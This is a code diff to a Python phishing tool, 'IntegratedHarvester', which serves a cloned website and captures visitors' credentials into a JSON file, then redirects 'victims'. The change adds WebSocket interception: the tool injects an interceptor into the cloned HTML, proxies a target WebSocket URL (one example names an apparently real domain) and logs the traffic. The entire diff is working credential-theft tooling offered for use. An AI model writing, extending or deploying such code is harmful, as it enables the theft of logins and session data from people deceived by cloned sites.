@@ -6,13 +6,15 @@ from pathlib import Path
 import json
 import threading
 from bs4 import BeautifulSoup
+from .websocket_interceptor import WebSocketInterceptor, inject_websocket_interceptor
 
 logger = logging.getLogger(__name__)
 
 class IntegratedHarvester:
     """Serves cloned site and captures credentials"""
     
-    def __init__(self, site_dir: str, port: int = 8080, output_file: str = "harvested_creds.json"):
+    def __init__(self, site_dir: str, port: int = 8080, output_file: str = "harvested_creds.json", 
+                 capture_websocket: bool = False, ws_url: str = None):
         self.site_dir = Path(site_dir)
         self.port = port
         self.output_file = Path(output_file)
@@ -21,6 +23,19 @@ class IntegratedHarvester:
         self.app = Flask(__name__)
         self.server_thread = None
         self.redirect_url = None
+        self.capture_websocket = capture_websocket
+        self.ws_url = ws_url
+        self.ws_interceptor = None
+        
+        # Setup WebSocket interceptor if enabled
+        if self.capture_websocket and self.ws_url:
+            self.ws_interceptor = WebSocketInterceptor(
+                output_file=str(self.output_file.parent / "websocket_capture.json")
+            )
+            # Inject WebSocket interceptor into HTML
+            inject_websocket_interceptor(str(self.site_dir), self.ws_url)
+            # Setup WebSocket proxy route
+            self.ws_interceptor.setup_websocket_proxy(self.app, self.ws_url)
         
         # Modify forms on startup
         self._modify_all_forms()
@@ -169,7 +184,9 @@ class IntegratedHarvester:
 
 def start_integrated_harvester(site_dir: str, port: int = 8080, 
                                output_file: str = "harvested_creds.json",
-                               redirect_url: str = None) -> IntegratedHarvester:
+                               redirect_url: str = None,
+                               capture_websocket: bool = False,
+                               ws_url: str = None) -> IntegratedHarvester:
     """Start integrated harvester that serves site and captures credentials
     
     Args:
@@ -177,10 +194,12 @@ def start_integrated_harvester(site_dir: str, port: int = 8080,
         port: Port to listen on
         output_file: File to save captured credentials
         redirect_url: URL to redirect victims after capture
+        capture_websocket: Enable WebSocket interception
+        ws_url: WebSocket URL to proxy (e.g., wss://pakamia.ke/ws)
         
     Returns:
         IntegratedHarvester instance
     """
-    harvester = IntegratedHarvester(site_dir, port, output_file)
+    harvester = IntegratedHarvester(site_dir, port, output_file, capture_websocket, ws_url)
     harvester.start(redirect_url=redirect_url, background=True)
     return harvester
